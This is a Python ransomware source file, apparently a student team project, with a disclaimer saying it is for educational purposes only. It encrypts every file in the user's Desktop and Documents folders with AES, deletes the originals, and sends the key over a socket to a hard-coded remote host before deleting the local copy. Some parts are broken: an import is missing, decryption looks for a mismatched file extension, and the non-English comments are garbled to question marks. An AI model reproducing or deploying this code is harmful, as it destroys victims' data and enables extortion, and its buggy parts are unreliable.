#2019 team project CODE
##DO NOT USE THIS CODE FOR MALICIOUS PURPOSES
#THIS IS ONLY FOR EDUCATIONAL PURPOSES

import os, glob, sys
from Crypto.Cipher import AES
from Crypto.Hash import SHA256 as sha

import socket
from time import sleep

KSIZE = 1024

class myAES():
    def __init__(self, keytext, ivtext):
        hash = sha.new()
        hash.update(keytext.encode('utf-8'))
        key = hash.digest()
        self.key = key[:16]

        hash.update(ivtext.encode('utf-8'))
        iv = hash.digest()
        self.iv = iv[:16]
        print(self.key, self.iv)

    def makeEncInfo(self, filename):
        fillersize = 0
        filesize = os.path.getsize(filename)
        if filesize % 16 != 0:
            fillersize = 16 - filesize % 16

        filler = '0'*fillersize
        header = ' %d' %(fillersize)
        gap = 16 - len(header)
        header += '#' * gap

        return header, filler

    def enc(self, filename):
        encfilename = filename + '.enc'
        header, filler = self.makeEncInfo(filename)
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        kk = open(keyPath + 'key.txt', 'wb+')
        kk.write(self.key)
        kk.close()

        h = open(filename, 'rb')
        hh = open(encfilename, 'wb+')
        enc = header.encode('utf-8')
        content = h.read(KSIZE)
        content = enc + content
        while content:
            if len(content) < KSIZE:
                content += filler.encode('utf-8')

            enc = aes.encrypt(content)
            hh.write(enc)
            content = h.read(KSIZE)

        h.close()
        hh.close()

    def dec(self, encfilename, readKey) :
        filename = encfilename.strip('.enc')
        aes = AES.new(readKey, AES.MODE_CBC, self.iv)

        h = open(filename, 'wb+')
        hh = open(encfilename, 'rb')

        content = hh.read(16)
        dec = aes.decrypt(content)
        header = dec.decode()
        fillersize = int(header.split('#') [0])

        content = hh.read(KSIZE)
        while content:
            dec = aes.decrypt(content)
            if len(dec) < KSIZE:
                if fillersize != 0:
                    dec = dec[:-fillersize]
            h.write(dec)
            content = hh.read(KSIZE)

        h.close()
        hh.close()

aesEnc = myAES('project', 'encAndDec')

def searchEncFile(path):
    for filename in glob.iglob(path, recursive = True):
        if 'key' in filename:
            pass
        elif os.path.isfile(filename):
            print('Encrypting> ' + filename) # ????????? ??????
            aesEnc.makeEncInfo(filename)
            aesEnc.enc(filename) # Encrypt_file??? ????????? ????????? ????????? ???????????? ????????? ??????
            os.remove(filename) # ??????????????? ?????? (encrypt_file ???????????? ???????????? ?????????????????? ??????????????? ???????????????.)
        elif os.path.isdir(filename):
            searchEncFile(filename + '\\*')

def searchDecFile(path):
    for filename in glob.iglob(path, recursive = True):
        if(os.path.isfile(filename)):
            fname, ext = os.path.splitext(filename) # ???????????? ???????????? ??????
            if (ext == '.sasya'): # ???????????? .enc (???????????? ????????? ???)
                print('Decrypting> ' + filename) # ????????? ??????
                aesEnc.dec(filename) # ????????? ?????? ??????
                os.remove(filename)
            if(os.path.isdir(filename)):
                searchDecFile(filename + '\\*')


colorama.init(autoreset=True)

#change before install on virtual machine
RHOST = "192.168.56.1"
RPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))


user = os.getenv("USERNAME")
startPath = 'C:\\Users\\' + user + '\\Desktop\\*'
documentPath = 'C:\\Users\\' + user + '\\Documents\\*'
#startPath = 'C:\\Users\\Yeeun\\Desktop\\Ransom_Private\\Ransom\\test\\*'
keyPath = 'C:\\Users\\' + user + '\\'
print(glob.glob(startPath, recursive=True))

searchEncFile(startPath)
searchEncFile(documentPath)

kk = open(keyPath + 'key.txt', 'wb+')

sock.send(kk)
os.remove(keyPath + 'key.txt')
